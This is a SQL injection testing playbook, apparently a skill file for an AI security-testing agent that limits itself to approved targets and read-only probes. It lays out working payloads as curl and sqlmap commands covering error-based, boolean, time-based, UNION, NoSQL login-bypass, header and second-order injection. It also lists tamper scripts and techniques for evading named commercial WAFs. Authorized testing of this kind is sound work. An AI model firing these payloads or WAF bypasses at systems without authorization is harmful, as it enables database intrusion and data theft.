---
name: harness-sqli
description: "Test error-based, blind boolean, blind time-based, UNION, stacked and second-order SQL injection with sqlmap and manual probes. One parameter per attempt, differential confirmation."
---

# SQLi deep — differential, one-param, bounded extraction

Source: `testing-for-sql-injection`, `sqlmap-usage`, `blind-sqli-techniques` (2024: JSON/GraphQL injection points, WAF bypass with inline comments, NoSQL operator injection).

## Gate

Approved `host+endpoint+parameter` only. Every command via `cyber_process` `argv`. One parameter per test. Extraction stops at proof (database name + version + one table name). No `DROP`, `DELETE`, `UPDATE`, `INSERT` — read-only probes. → `harness-vuln-triage` before `cyber_finding`.

## Steps

### 1. Parameter and context identification

Map all input vectors on the endpoint:
- URL query parameters (`?id=1`)
- POST body (form, JSON, XML, multipart)
- HTTP headers (Cookie values, Referer, X-Forwarded-For, custom headers)
- Path segments (`/api/user/1`)
- GraphQL variables and directives

For each, record the expected type (integer, string, date, boolean, array, JSON object).

### 2. Positive control — baseline request

```
cyber_process argv=["curl","-sS","-D","-","-o","baseline.html","-w","status:%{http_code} size:%{size_download} time:%{time_total}","<url>/endpoint?id=1"]
```

Record status, body size, response time. Hash the body. This is the functional baseline.

### 3. Error-based detection

```
cyber_process argv=["curl","-sS","-D","-","-o","probe-sq.html","-w","status:%{http_code} size:%{size_download}","<url>/endpoint?id=1%27"]
cyber_process argv=["curl","-sS","-D","-","-o","probe-dq.html","-w","status:%{http_code} size:%{size_download}","<url>/endpoint?id=1%22"]
cyber_process argv=["curl","-sS","-D","-","-o","probe-bs.html","-w","status:%{http_code} size:%{size_download}","<url>/endpoint?id=1%5C"]
cyber_process argv=["curl","-sS","-D","-","-o","probe-paren.html","-w","status:%{http_code} size:%{size_download}","<url>/endpoint?id=1)"]
```

Compare each against baseline. Status change, body size change, or SQL error string (`syntax error`, `unclosed quotation`, `ORA-`, `PG::`) = injection signal.

### 4. Differential boolean — true vs false

```
cyber_process argv=["curl","-sS","-D","-","-o","diff-true.html","-w","status:%{http_code} size:%{size_download}","<url>/endpoint?id=1'+OR+'1'%3d'1"]
cyber_process argv=["curl","-sS","-D","-","-o","diff-false.html","-w","status:%{http_code} size:%{size_download}","<url>/endpoint?id=1'+OR+'1'%3d'2"]
```

**Differential test**: true and false MUST produce different responses (body size, content, status). Same response = not injectable. Hash both bodies.

For integer context (no quotes):

```
cyber_process argv=["curl","-sS","-D","-","-o","diff-int-true.html","-w","status:%{http_code} size:%{size_download}","<url>/endpoint?id=1+AND+1%3d1"]
cyber_process argv=["curl","-sS","-D","-","-o","diff-int-false.html","-w","status:%{http_code} size:%{size_download}","<url>/endpoint?id=1+AND+1%3d2"]
```

### 5. Blind time-based detection

Three samples for baseline, three for payload:

```
cyber_process argv=["curl","-sS","-o","/dev/null","-w","time:%{time_total}","<url>/endpoint?id=1"]
cyber_process argv=["curl","-sS","-o","/dev/null","-w","time:%{time_total}","<url>/endpoint?id=1'+AND+SLEEP(5)--+-"]
```

MySQL variant. For PostgreSQL:

```
cyber_process argv=["curl","-sS","-o","/dev/null","-w","time:%{time_total}","<url>/endpoint?id=1';SELECT+pg_sleep(5)--+-"]
```

For MSSQL:

```
cyber_process argv=["curl","-sS","-o","/dev/null","-w","time:%{time_total}","<url>/endpoint?id=1';WAITFOR+DELAY+'0:0:5'--+-"]
```

Confirmation: 3 consecutive runs with consistent delay > 4s above baseline median. One sample is never proof.

### 6. UNION-based extraction

Column count via ORDER BY:

```
cyber_process argv=["curl","-sS","-D","-","-w","status:%{http_code}","<url>/endpoint?id=1+ORDER+BY+5--+-"]
cyber_process argv=["curl","-sS","-D","-","-w","status:%{http_code}","<url>/endpoint?id=1+ORDER+BY+6--+-"]
```

Find displayable column:

```
cyber_process argv=["curl","-sS","-D","-","<url>/endpoint?id=-1+UNION+SELECT+1,2,3,4,5--+-"]
```

Extract proof (stop at version + one table):

```
cyber_process argv=["curl","-sS","-D","-","<url>/endpoint?id=-1+UNION+SELECT+1,@@version,3,4,5--+-"]
cyber_process argv=["curl","-sS","-D","-","<url>/endpoint?id=-1+UNION+SELECT+1,table_name,3,4,5+FROM+information_schema.tables+LIMIT+1--+-"]
```

### 7. sqlmap automation (after manual confirmation only)

```
cyber_process argv=["sqlmap","-u","<url>/endpoint?id=1","--batch","--risk=1","--level=3","--technique=BEUST","--dbms=<detected>","--threads=1","--banner","--current-db","--current-user","--tables","--stop","1","--output-dir=<evidence-dir>/sqlmap"]
```

Tamper scripts by WAF:
| WAF | Tamper |
|---|---|
| Cloudflare | `between,randomcase,space2comment` |
| Akamai | `charencode,greatest,between` |
| AWS WAF | `space2mssqlblank,randomcase` |
| ModSecurity | `modsecurityversioned,space2comment,between` |
| Generic | `space2comment,randomcase,between,equaltolike` |

Record the sqlmap output directory as an observation.

### 8. Special injection contexts

**JSON body injection:**

```
cyber_process argv=["curl","-sS","-D","-","-X","POST","-H","Content-Type: application/json","-d","{\"id\":\"1' OR '1'='1\",\"name\":\"test\"}","<url>/api/endpoint"]
cyber_process argv=["curl","-sS","-D","-","-X","POST","-H","Content-Type: application/json","-d","{\"id\":\"1' OR '1'='2\",\"name\":\"test\"}","<url>/api/endpoint"]
```

**GraphQL variable injection:**

```
cyber_process argv=["curl","-sS","-D","-","-X","POST","-H","Content-Type: application/json","-d","{\"query\":\"query { user(id: \\\"1' OR '1'='1\\\") { name } }\"}","<url>/graphql"]
```

**NoSQL operator injection (MongoDB):**

```
cyber_process argv=["curl","-sS","-D","-","-X","POST","-H","Content-Type: application/json","-d","{\"username\":{\"$gt\":\"\"},\"password\":{\"$gt\":\"\"}}","<url>/api/login"]
cyber_process argv=["curl","-sS","-D","-","-X","POST","-H","Content-Type: application/json","-d","{\"username\":\"admin\",\"password\":{\"$regex\":\"^.\"}}","<url>/api/login"]
```

**Header injection:**

```
cyber_process argv=["curl","-sS","-D","-","-o","/dev/null","-w","time:%{time_total}","-H","X-Forwarded-For: 1' AND SLEEP(5)-- -","<url>/endpoint"]
cyber_process argv=["curl","-sS","-D","-","-H","Referer: https://target/' OR '1'='1","<url>/endpoint"]
```

**Second-order:** inject in registration, then check in admin/export:

```
cyber_process argv=["curl","-sS","-D","-","-X","POST","-H","Content-Type: application/json","-d","{\"username\":\"test'||(SELECT 1 FROM dual)||'\",\"password\":\"test123\"}","<url>/api/register"]
cyber_process argv=["curl","-sS","-D","-","-H","Cookie: <admin-session>","<url>/admin/users/export"]
```

### 9. Negative controls

```
cyber_process argv=["curl","-sS","-D","-","-o","ctrl-baseline.html","-w","status:%{http_code} size:%{size_download}","<url>/endpoint?id=1"]
cyber_process argv=["curl","-sS","-D","-","-o","ctrl-safe.html","-w","status:%{http_code} size:%{size_download}","<url>/endpoint?id=AAAA"]
cyber_process argv=["curl","-sS","-D","-","-o","ctrl-other-param.html","-w","status:%{http_code} size:%{size_download}","<url>/endpoint?id=1&safe_param=1'+OR+'1'%3d'1"]
cyber_process argv=["curl","-sS","-o","/dev/null","-w","time:%{time_total}","<url>/endpoint?id=1'+AND+SLEEP(0)--+-"]
```

| Control | Description | Expected |
|---|---|---|
| Baseline | original value `id=1` | normal 200, baseline body |
| Safe string | `id=AAAA` (no SQL meaning) | error or empty, no SQL behavior |
| Non-injectable param | payload on `safe_param` | no SQL effect |
| `SLEEP(0)` | zero-delay control for time-based | no delay (matches baseline timing) |

### 10. Evidence assembly

`cyber_finding` with:
- `evidence`: baseline + error probes + true/false differential + extraction proof + sqlmap output + all 4 negative controls
- `sources`: the response diff showing the differential behavior
- `checks`: baseline:positive-control, true-condition:reproduction, false-condition:negative-control, safe-string:negative-control, SLEEP(0):timing-control
- `impact`: database type + version + current user + privilege level (DBA? file read? OS command?)

## Verification scenarios

| Scenario | Observation | Expected classification |
|---|---|---|
| `id=1'` returns SQL error string | `syntax error` / `ORA-` / `PG::` in body | error-based SQLi candidate |
| `id=1'` returns same 200 as baseline | identical body | not error-based |
| True vs false differential: different body size | >10% difference | boolean blind SQLi candidate |
| True vs false: identical response | same size + same hash | not injectable |
| `SLEEP(5)` adds >4s consistently, 3 samples | 3x time_total > baseline+4s | time-based blind SQLi candidate |
| `SLEEP(0)` matches baseline timing | normal time_total | timing control confirmed |
| UNION extraction returns `@@version` | version string in body | UNION SQLi confirmed |
| `sqlmap --banner` succeeds after manual confirm | banner + current-db in output | sqlmap confirmation |
| NoSQL `$gt` returns all users | body contains multiple records | NoSQL injection candidate |
| NoSQL `$gt` returns only requested user | single record | not NoSQL injectable |
| Header `SLEEP(5)` causes delay | time_total > baseline+4s | header injection candidate |
| Second-order: injected value triggers in export | SQL output in export body | second-order candidate |

### WAF bypass protocol

If payloads are blocked:
1. Identify WAF via response headers and `wafw00f`.
2. Encoding: URL double-encode, Unicode (`%u0027`), hex (`0x27`).
3. Comments: `/*!50000 UNION*/`, `/**/`, `--+-`.
4. Case: `uNiOn SeLeCt`, `UnIoN%0a%0dSeLeCt`.
5. Functions: `CONCAT(0x,…)` instead of strings, `CHAR()` instead of quotes.
6. HTTP: different methods (GET→POST), `Content-Type` switch, chunked encoding.

## Proof contract

A finding needs: (1) identified injectable parameter and context, (2) differential proof (true vs false), (3) extracted proof data (version/table), (4) reproduction, (5) four negative controls. A `500` error alone is a lead, not a finding. Time-based needs 3 consistent samples.

## Done

Each SQLi cites the parameter, context, differential proof, extraction depth, and all negative controls. `sqlmap --batch` output alone is not proof without the manual differential.
